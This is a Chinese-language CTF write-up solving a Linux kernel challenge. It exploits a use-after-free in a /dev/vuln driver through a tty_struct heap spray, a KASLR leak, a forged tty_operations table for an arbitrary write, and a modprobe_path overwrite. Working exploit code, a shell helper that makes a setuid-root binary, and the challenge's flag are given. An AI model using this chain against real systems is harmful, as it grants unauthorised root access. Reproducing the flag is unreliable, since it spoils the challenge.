# Baby Kernel

## 题目简述

题目提供 Linux 6.6.16 内核、一个 `/dev/vuln` misc 设备和普通用户 shell。驱动允许申请、释放、读取和写入一块全局 `kzalloc` 缓冲区；`FREE` 后没有把全局指针 `buf` 置空，形成内核 UAF。官方解法让 1024 字节释放块被 `tty_struct` 占用，泄漏内核地址并伪造 `tty_operations`，得到 4 字节任意写，最后改写 `modprobe_path` 提权。

## 解题过程

驱动的根因非常直接：

```c
void *buf;
size_t size;

case FREE:
    kfree(buf);          // buf 仍是非 NULL 悬空指针
    break;
case USE_READ:
    return copy_to_user((char *)arg, buf, size);
case USE_WRITE:
    return copy_from_user(buf, (char *)arg, size);
```

先申请并释放 1024 字节对象。不断打开 `/dev/ptmx` 会分配 `tty_struct`，其 slab 尺寸能复用这块内存。每次喷射后经 `USE_READ` 检查偏移 `0x20` 是否出现高地址内核指针，以确认重叠成功：

```c
size_t n = 1024;
int vuln = open("/dev/vuln", O_RDONLY);
ioctl(vuln, ALLOC, &n);
ioctl(vuln, FREE);

for (int i = 0; i < 1000; i++) {
    int ptmx = open("/dev/ptmx", O_RDONLY);
    ioctl(vuln, USE_READ, leakbuf);
    if (*(uint64_t *)&leakbuf[0x20] >= 0xffffffff00000000UL)
        break;
}
```

重叠后的 `tty_struct` 在偏移 `0x20` 泄漏 `ptm_unix98_ops`，偏移 `0x40` 的内部指针可反推出当前 1024 字节对象地址 `buf_ptr`。KASLR 开启，因此所有目标都相对泄漏计算：

```c
ptm_unix98_ops = *(uint64_t *)&leakbuf[0x20];
buf_ptr = *(uint64_t *)&leakbuf[0x40] - 0x40;

gadget = ptm_unix98_ops
       + (0xffffffff813cdc0bUL - 0xffffffff82285100UL);
modprobe_path = ptm_unix98_ops
              + (0xffffffff82b3f600UL - 0xffffffff82285100UL);
```

把 UAF 对象中偏移 `0x320` 开始的若干函数指针全部填成 `mov dword ptr [rdx], ecx; ret` gadget，再把 `tty_struct.ops`（偏移 `0x20`）改为 `buf_ptr + 0x320`。对重叠的 ptmx fd 调用 `ioctl` 时，就能以参数控制目标地址和 32 位写入值：

```c
uint64_t fake[128] = {0};
for (int i = 100; i < 120; i++)
    fake[i] = gadget;
fake[4] = (uint64_t)buf_ptr + 100 * 8;
ioctl(vuln, USE_WRITE, fake);

// 官方 exploit 的调用约定最终令 gadget 把 value 写入 address
ioctl(ptmx, value, address);
```

分两次 4 字节写把 `modprobe_path` 改成 `/tmp/mp\0`。随后创建 root 执行的 helper、一个无法识别格式的可执行文件，并触发内核的 modprobe fallback：

```sh
cat >/tmp/mp <<'EOF'
#!/bin/sh
chown 0:0 /tmp/exploit
chmod 4777 /tmp/exploit
EOF
chmod +x /tmp/mp
printf '\xff\xff\xff\xff' > /tmp/a
chmod +x /tmp/a
/tmp/a
/tmp/exploit root
```

`/tmp/exploit root` 走程序的第二分支，执行 `setuid(0)`、`setgid(0)` 并启动 shell。读取仅 root 可见的 `/flag.txt`，得到真实 flag：

```text
uiuctf{use_after_free_ecda3a86}
```

题目配置中的 `uiuctf{kernel_not_so_scary_faecc280}` 明确标为假 flag，不能误收录为答案。

## 方法总结

- 核心技巧：用 `tty_struct` 堆喷复用内核 UAF，对其操作表做对象内伪造，把间接调用转换为任意 4 字节写。
- 识别信号：全局内核指针释放后未清空，同时 ioctl 仍允许按旧大小读写，是典型可重占的 UAF。
- 复用要点：KASLR 环境下不要硬编码运行时地址；从稳定的函数表指针泄漏基址，再以同一份 `vmlinux` 计算 gadget 与 `modprobe_path`。对象大小、字段偏移和调用约定也必须与目标内核逐项核对。
